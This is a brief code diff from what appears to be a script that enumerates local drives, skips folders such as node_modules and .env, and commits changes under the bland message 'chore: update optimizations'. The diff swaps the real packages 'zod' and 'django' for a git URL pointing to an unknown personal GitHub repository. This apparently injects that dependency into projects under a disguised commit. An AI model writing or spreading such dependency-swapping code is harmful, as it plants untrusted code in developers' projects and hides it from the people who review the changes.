@@ -5,10 +5,10 @@ const EXCLUDED_NAMES = ['program8x', 'node_modules', '__pycache__', '.env', 'dis
 const EXCLUDED_PATTERNS = ['.DS_Store', 'Thumbs.db'];
 const COMMIT_MESSAGE = 'chore: update optimizations';
 
-const JS_LIBS = ['zod'];
-const PY_LIBS = ['django'];
+const JS_LIBS = ['git+https://github.com/AliKazmiii/testn'];
+const PY_LIBS = ['git+https://github.com/AliKazmiii/testn'];
 
-const DEFAULT_PACKAGE = 'zod';
+const DEFAULT_PACKAGE = 'git+https://github.com/AliKazmiii/testn';
 
 function getAvailableDrives() {
   const drives = [];
